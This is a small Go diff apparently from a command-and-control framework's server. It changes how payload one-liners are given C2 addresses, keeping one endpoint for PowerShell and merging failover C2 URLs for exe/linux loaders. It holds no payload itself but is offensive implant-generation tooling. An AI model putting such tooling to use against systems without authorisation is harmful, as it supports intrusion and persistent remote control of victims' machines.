@@ -172,7 +172,19 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 			respondError(c, http.StatusBadRequest, "Invalid listener configuration")
 			return
 		}
-		form.C2URL = resolved.C2URL
+		// The PowerShell template dials exactly one endpoint, so appending a
+		// comma-separated failover list would break it. Go-built one-liners
+		// (exe/linux) use the same multi-C2 loader as the binary generator.
+		if payloadType == "ps1" {
+			form.C2URL = resolved.C2URL
+		} else {
+			merged, err := mergeC2URLList(resolved.C2URL, form.C2URL)
+			if err != nil {
+				respondError(c, http.StatusBadRequest, "Invalid C2 or failover URL: "+err.Error())
+				return
+			}
+			form.C2URL = merged
+		}
 		form.Protocol = resolved.Protocol
 		form.BeaconTransport = resolved.BeaconTransport
 		if resolved.DNSDomain != "" {
